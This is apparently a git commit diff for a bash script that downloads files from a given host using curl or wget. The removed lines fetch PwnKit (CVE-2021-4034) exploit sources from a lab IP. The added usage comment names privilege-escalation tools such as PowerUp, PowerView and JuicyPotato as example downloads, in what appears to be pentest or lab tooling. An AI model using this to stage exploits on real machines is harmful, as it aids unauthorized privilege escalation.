0b50264e20c79fa29295ec2b167c5f1ae4cc009a
Kabexnuf <101733340+YavuzSahbaz@users.noreply.github.com>
2023-04-12 22:37:10 -0400

    Update MultiFileDownload.sh

--- MultiFileDownload.sh
+++ MultiFileDownload.sh
@@ -1,11 +1,31 @@
 #!/bin/bash
+#$ ./MultiFileDownload.sh give chmod +x permission before use. 
+#Enter host URL: http://192.168.119.172:8080
+#Enter file names (separated by space): PowerUp.exe PowerView.elf JuicyPotato.py
+#Enter destination directory: ./Downloads
 
-# URLs of the files to be downloaded
-url1="http://192.168.119.145/cve-2021-4034.c"
-url2="http://192.168.119.145/pwnkit.c"
-url3="http://192.168.119.145/Makefile"
-url4="http://192.168.119.145/cve-2021-4034.sh"
+# Display ASCII art with color
+echo -e "\033[1;36m"
+cat << "EOF"
+ ,---,---,---,---,---,---,---,---,---,---,---,---,
+| Y | a | v | u | z |   | S | a | h | b | a | z |   |
+|---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-|
+|     ___                                             __
+|   /   \           ___ ___   ____ ___  ____   _____/  |_
+|   \_   \   ______\  \\  \_/ ___\\  \/  /  _ \ /    \   __\
+|   /   /  /_____/  >  <\___ \\___ \>    <\_\ \_\   |  |
+|  /___/           /__/ /____/_____/__/\_ \___  /___|  /
+|                                       \/    \/     \/
+|---,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'--|
+| Y | a | v | u | z |   | S | a | h | b | a | z |   |
+ `---'---'---'---'---'---'---'---'---'---'---'---'---'
+EOF
+echo -e "\033[0m"
 
+# Get input values
+read -p "Enter host URL: " host_url
+read -p "Enter file names (separated by space): " -a file_names
+read -p "Enter destination directory: " destination
 
 # Function to download files using curl
 download_curl() {
@@ -27,21 +47,25 @@ else
     exit 1
 fi
 
-# Download files concurrently based on the available downloader
-if [[ "$downloader" == "curl" ]]; then
-    download_curl "$url1"
-    download_curl "$url2"
-    download_curl "$url3"
-    download_curl "$url4"
-elif [[ "$downloader" == "wget" ]]; then
-    download_wget "$url1"
-    download_wget "$url2"
-    download_wget "$url3"
-    download_wget "$url4"
+# Ensure the destination folder exists
+if [[ ! -d "$destination" ]]; then
+    mkdir -p "$destination"
 fi
+
+# Download files using the available downloader
+cd "$destination"
+for file_name in "${file_names[@]}"; do
+    url="${host_url}/${file_name}"
+    echo "Downloading $url to $destination"
+
+    if [[ "$downloader" == "curl" ]]; then
+        download_curl "$url"
+    elif [[ "$downloader" == "wget" ]]; then
+        download_wget "$url"
+    fi
+done
 
 # Wait for all background processes (downloads) to finish
 wait
 
-# Print a message when all downloads are complete
 echo "All downloads completed using $downloader."
